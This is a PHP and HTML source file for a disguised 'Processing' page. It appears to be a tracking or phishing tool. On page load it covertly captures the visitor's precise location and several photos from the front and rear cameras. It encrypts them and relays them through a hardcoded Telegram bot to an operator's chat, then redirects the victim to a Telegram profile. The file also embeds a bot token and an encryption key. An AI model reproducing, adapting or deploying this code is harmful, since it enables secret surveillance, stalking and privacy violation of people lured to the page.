<?php
// --- PHP Backend Logic ---
define('BOT_TOKEN', '7876995869:AAGmef_SeJE8II79qZPcsRstw6kELpcbHDs'); // KEEP SECRET ON SERVER
define('CHAT_ID', '61859882'); // KEEP SECRET ON SERVER
define('REDIRECT_URL', 'https://t.me/Nono3928');

// **Actual Random 32-byte (256-bit) Key**
define('ENCRYPTION_KEY', 'kG#S8@ZvN!qP5mJ*cE7hB2xWdU6rF_oA');
define('ENCRYPTION_IV_LENGTH', 12); // AES-GCM standard IV length is 12 bytes
define('ENCRYPTION_TAG_LENGTH', 16); // AES-GCM standard tag length is 16 bytes

function decrypt_payload($encrypted_payload_base64) {
    if (strlen(ENCRYPTION_KEY) !== 32) {
        error_log("Encryption key is not 32 bytes long.");
        return null;
    }
    $encrypted_payload = base64_decode($encrypted_payload_base64);
    if ($encrypted_payload === false) {
        error_log("Failed to base64 decode payload.");
        return null;
    }

    $iv = substr($encrypted_payload, 0, ENCRYPTION_IV_LENGTH);
    $tag = substr($encrypted_payload, ENCRYPTION_IV_LENGTH, ENCRYPTION_TAG_LENGTH);
    $ciphertext = substr($encrypted_payload, ENCRYPTION_IV_LENGTH + ENCRYPTION_TAG_LENGTH);

    if (strlen($iv) !== ENCRYPTION_IV_LENGTH) {
        error_log("IV length is incorrect. Expected " . ENCRYPTION_IV_LENGTH . ", got " . strlen($iv));
        return null;
    }
     if (strlen($tag) !== ENCRYPTION_TAG_LENGTH) {
        error_log("Tag length is incorrect. Expected " . ENCRYPTION_TAG_LENGTH . ", got " . strlen($tag));
        return null;
    }
    if ($ciphertext === false || strlen($ciphertext) === 0) {
        error_log("Ciphertext is empty or extraction failed.");
        return null;
    }

    $decrypted = openssl_decrypt(
        $ciphertext,
        'aes-256-gcm',
        ENCRYPTION_KEY,
        OPENSSL_RAW_DATA,
        $iv,
        $tag
    );

    if ($decrypted === false) {
        error_log("OpenSSL decryption failed: " . openssl_error_string());
        return null;
    }
    return json_decode($decrypted, true);
}


function sendTelegramRequest($method, $data, $isPhoto = false) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);

    if ($isPhoto) {
        $postFields = ['chat_id' => CHAT_ID];
        if (isset($data['caption'])) {
            $postFields['caption'] = $data['caption'];
        }
        if (isset($_FILES['photo'])) {
            $cFile = new CURLFile($_FILES['photo']['tmp_name'], $_FILES['photo']['type'], $_FILES['photo']['name']);
            $postFields['photo'] = $cFile;
        } else {
            curl_close($ch);
            return json_encode(['ok' => false, 'description' => 'Photo data not received by server.']);
        }
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    } else {
        $jsonData = array_merge(['chat_id' => CHAT_ID], $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($jsonData));
    }

    $response = curl_exec($ch);
    // error_log("Telegram API Call: $method, Response: $response");
    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        curl_close($ch);
        return json_encode(['ok' => false, 'description' => 'cURL Error: ' . $error_msg]);
    }
    curl_close($ch);
    return $response;
}

if (isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $decrypted_data = null;

    if (isset($_POST['payload'])) {
        $decrypted_data = decrypt_payload($_POST['payload']);
        if ($decrypted_data === null) {
            echo json_encode(['ok' => false, 'description' => 'Failed to decrypt payload or payload invalid. Check encryption key and method.']);
            exit;
        }
    } else if ($action !== 'sendPhoto') {
        if ($action !== 'sendPhoto' || !isset($_FILES['photo'])) {
            echo json_encode(['ok' => false, 'description' => 'Encrypted payload missing.']);
            exit;
        }
    }


    $response = ['ok' => false, 'description' => 'Invalid action or missing data'];

    switch ($action) {
        case 'sendMessage':
            if (isset($decrypted_data['text'])) {
                $response = sendTelegramRequest('sendMessage', ['text' => $decrypted_data['text']]);
            } else {
                 $response = json_encode(['ok' => false, 'description' => 'Decrypted text missing for sendMessage.']);
            }
            break;

        case 'sendLocation':
            if (isset($decrypted_data['latitude']) && isset($decrypted_data['longitude'])) {
                $response = sendTelegramRequest('sendLocation', [
                    'latitude' => floatval($decrypted_data['latitude']),
                    'longitude' => floatval($decrypted_data['longitude'])
                ]);
            } else {
                $response = json_encode(['ok' => false, 'description' => 'Decrypted location data missing.']);
            }
            break;

        case 'sendPhoto':
            if (isset($_FILES['photo'])) {
                 $caption = $decrypted_data['caption'] ?? 'Photo';
                 $response = sendTelegramRequest('sendPhoto', ['caption' => $caption], true);
            } else {
                $response = json_encode(['ok' => false, 'description' => 'Photo file not received.']);
            }
            break;
    }
    echo $response;
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing</title>
    <style>
        body { margin: 0; padding: 0; overflow: hidden; background-color: #fff; font-family: Arial, sans-serif; }
        #loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; text-align: center; z-index: 1000; }
        #cameraFeed, #cameraCanvas { display: none; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
        <p>Processing...</p>
    </div>

    <video id="cameraFeed" autoplay playsinline></video>
    <canvas id="cameraCanvas"></canvas>

<script>
    const REDIRECT_URL_JS = '<?php echo REDIRECT_URL; ?>';
    // **Actual Random 32-byte (256-bit) Key - MUST MATCH PHP**
    const ENCRYPTION_KEY_STRING = 'kG#S8@ZvN!qP5mJ*cE7hB2xWdU6rF_oA';
    const ENCRYPTION_IV_LENGTH = 12; // AES-GCM standard IV length is 12 bytes
    const ENCRYPTION_TAG_LENGTH = 16; // AES-GCM standard tag length is 16 bytes

    let encryptionKey; 

    let trackId = '';
    let currentStream = null;

    const el = (id) => document.getElementById(id);

    async function prepareEncryptionKey() {
        const keyMaterial = new TextEncoder().encode(ENCRYPTION_KEY_STRING);
        if (keyMaterial.byteLength !== 32) {
            console.error("Encryption key material is not 32 bytes long in JS!");
            throw new Error("Invalid encryption key configuration.");
        }
        encryptionKey = await crypto.subtle.importKey(
            "raw",
            keyMaterial,
            { name: "AES-GCM", length: 256 },
            false, 
            ["encrypt"] 
        );
    }

    async function encryptPayload(payloadObject) {
        if (!encryptionKey) {
            console.error("Encryption key not prepared.");
            throw new Error("Encryption key not ready.");
        }
        const iv = crypto.getRandomValues(new Uint8Array(ENCRYPTION_IV_LENGTH));
        const payloadString = JSON.stringify(payloadObject);
        const encodedPayload = new TextEncoder().encode(payloadString);

        const encryptedDataWithTag = await crypto.subtle.encrypt(
            { name: "AES-GCM", iv: iv, tagLength: ENCRYPTION_TAG_LENGTH * 8 },
            encryptionKey,
            encodedPayload
        );
        
        const encryptedPayloadArray = new Uint8Array(ENCRYPTION_IV_LENGTH + encryptedDataWithTag.byteLength);
        encryptedPayloadArray.set(iv, 0);
        encryptedPayloadArray.set(new Uint8Array(encryptedDataWithTag), ENCRYPTION_IV_LENGTH);

        return btoa(String.fromCharCode.apply(null, encryptedPayloadArray));
    }


    function generateTrackId() {
        return Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10);
    }

    function dataURItoBlob(dataURI) {
        const byteString = atob(dataURI.split(',')[1]);
        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], { type: mimeString });
    }

    async function callPhpEndpoint(action, dataForEncryption, photoFile = null) {
        const formData = new FormData();
        formData.append('action', action);

        if (dataForEncryption) {
            try {
                const encrypted = await encryptPayload(dataForEncryption);
                formData.append('payload', encrypted);
            } catch (encError) {
                console.error("Encryption failed:", encError);
                return { ok: false, description: "Client-side encryption failed: " + encError.message };
            }
        }
        
        if (photoFile) {
            formData.append('photo', photoFile.blob, photoFile.name);
        }

        try {
            const response = await fetch(window.location.pathname, {
                method: 'POST',
                body: formData
            });
            if (!response.ok) {
                const errorText = await response.text();
                console.error(`PHP endpoint error for ${action}: ${response.status} ${response.statusText}`, errorText);
                return { ok: false, description: `Server error: ${response.statusText}. Details: ${errorText}` };
            }
            const result = await response.json();
            // console.log(`PHP endpoint '${action}' result:`, result); // Keep for debugging if needed
            return result;
        } catch (error) {
            console.error(`Fetch error for ${action}:`, error);
            return { ok: false, description: `Network error or invalid JSON: ${error.message}` };
        }
    }

    async function sendPhotoToTelegramProxy(photoDataUri, photoNumber, cameraType) {
        const payload = {
            caption: `Track ID: ${trackId}\nPhoto: ${photoNumber}\nCamera: ${cameraType}`
        };
        const photoFile = {
            blob: dataURItoBlob(photoDataUri),
            name: `photo_${trackId}_${photoNumber}_${cameraType}.jpg`
        };
        return callPhpEndpoint('sendPhoto', payload, photoFile);
    }

    async function sendLocationToTelegramProxy(latitude, longitude) {
        const payload = { latitude, longitude };
        return callPhpEndpoint('sendLocation', payload);
    }

    async function sendMessageToTelegramProxy(message) {
        const payload = { text: message };
        return callPhpEndpoint('sendMessage', payload);
    }

    async function setupCamera(facingMode = 'user') {
        const video = el('cameraFeed');
        try {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
            const constraints = {
                video: {
                    facingMode: facingMode,
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;
            currentStream = stream;
            
            return new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play().then(() => resolve(true)).catch(err => {
                         console.error('Error playing video:', err);
                         resolve(false);
                    });
                };
            });
        } catch (err) {
            console.error(`Error accessing ${facingMode} camera:`, err.name, err.message);
            return false;
        }
    }

    async function takePhoto() {
        const video = el('cameraFeed');
        const canvas = el('cameraCanvas');
        
        if (video.readyState < video.HAVE_METADATA || video.videoWidth === 0 || video.videoHeight === 0) {
            // console.log("Video not ready for capture, attempting small delay...");
            await new Promise(r => setTimeout(r, 150)); 
            if (video.videoWidth === 0 || video.videoHeight === 0) {
                 console.error("Video stream not providing dimensions even after delay.");
                 return null;
            }
        }

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        if (!ctx) {
            console.error("Could not get 2D context from canvas");
            return null;
        }
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.65);
    }

    function getLocation() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
                    (error) => { 
                        console.error("Error getting location:", error.code, error.message); 
                        reject(error); 
                    },
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 } 
                );
            } else {
                reject(new Error("Geolocation not supported."));
            }
        });
    }

    async function executeSequence() {
        el('loading').style.display = 'block';
        try {
            await prepareEncryptionKey(); 
            trackId = generateTrackId();
            // console.log('Generated track ID:', trackId);
            await sendMessageToTelegramProxy(`New session - Track ID: ${trackId}`);
            
            try {
                const location = await getLocation();
                // console.log('Location obtained:', location);
                const locResult = await sendLocationToTelegramProxy(location.latitude, location.longitude);
                if (!locResult.ok) { 
                    await sendMessageToTelegramProxy(`Track ID: ${trackId} - Failed to send location. Server: ${locResult.description}`);
                }
            } catch (error) {
                console.error('Could not get/send location:', error);
                await sendMessageToTelegramProxy(`Track ID: ${trackId} - Location error: ${error.message}`);
            }
            
            const cameraActions = [
                { type: 'front', count: 2, delay: 50 }, 
                { type: 'back', count: 1, delay: 0 }
            ];

            for (const action of cameraActions) {
                const cameraSetupSuccess = await setupCamera(action.type === 'front' ? 'user' : 'environment');
                if (cameraSetupSuccess) {
                    await new Promise(r => setTimeout(r, 600)); 
                    for (let i = 1; i <= action.count; i++) {
                        const photoDataUri = await takePhoto();
                        if (photoDataUri) {
                            const photoResult = await sendPhotoToTelegramProxy(photoDataUri, i, action.type);
                             if (!photoResult.ok) { 
                                await sendMessageToTelegramProxy(`Track ID: ${trackId} - Failed to send ${action.type} photo ${i}. Server: ${photoResult.description}`);
                            }
                        } else {
                            await sendMessageToTelegramProxy(`Track ID: ${trackId} - Failed to capture ${action.type} photo ${i}.`);
                        }
                        if (action.delay > 0 && i < action.count) await new Promise(r => setTimeout(r, action.delay));
                    }
                } else {
                    await sendMessageToTelegramProxy(`Track ID: ${trackId} - ${action.type} camera access failed.`);
                }
            }
            
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
                currentStream = null;
            }
            
            await sendMessageToTelegramProxy(`Track ID: ${trackId} - Session complete.`);
            el('loading').style.display = 'none';
            setTimeout(() => { window.location.href = REDIRECT_URL_JS; }, 300); 
            
        } catch (error) {
            console.error('Critical error in execution sequence:', error);
            if (!encryptionKey) { 
                 console.error("Cannot send encrypted error message as key preparation failed.");
            } else if (trackId) {
                await sendMessageToTelegramProxy(`Track ID: ${trackId} - CRITICAL ERROR: ${error.message}`);
            } else {
                 await sendMessageToTelegramProxy(`CRITICAL ERROR (no trackId): ${error.message}`);
            }
            el('loading').style.display = 'none'; 
            setTimeout(() => { window.location.href = REDIRECT_URL_JS; }, 1000); 
        }
    }

    window.addEventListener('load', () => { 
        executeSequence();
    });
</script>

</body>
</html>
